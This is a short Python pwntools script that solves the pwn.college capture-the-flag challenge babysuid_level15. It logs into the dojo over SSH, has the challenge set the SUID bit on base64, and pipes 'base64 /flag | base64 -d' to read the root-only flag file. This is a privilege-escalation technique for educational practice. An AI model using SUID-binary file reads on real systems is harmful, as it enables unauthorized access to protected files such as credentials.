from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level15 to make /usr/bin/base64 SUID
s.process("/challenge/babysuid_level15")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/base64 /flag
# ? The first base64 command encodes the flag
# ? Pipe to base64 with "-d" to decode the flag
sh.sendline(b"base64 /flag | base64 -d")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"FLAG: pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
